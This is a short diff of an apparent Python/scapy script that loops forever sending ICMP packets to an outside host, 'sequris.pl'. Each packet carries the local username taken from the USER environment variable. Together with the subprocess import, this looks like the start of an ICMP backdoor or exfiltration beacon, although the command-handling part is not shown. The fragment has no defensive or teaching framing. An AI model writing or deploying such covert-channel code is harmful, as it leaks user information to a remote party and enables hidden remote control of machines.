@@ -1,7 +1,7 @@
 from scapy.all import sr1,IP,ICMP,send
 import os, time, re, subprocess
 
-target = "40.74.51.247"
+target = "sequris.pl"
 uid = os.environ['USER']
 while True:
     p = sr1(IP(dst=target)/ICMP()/uid, verbose=0)
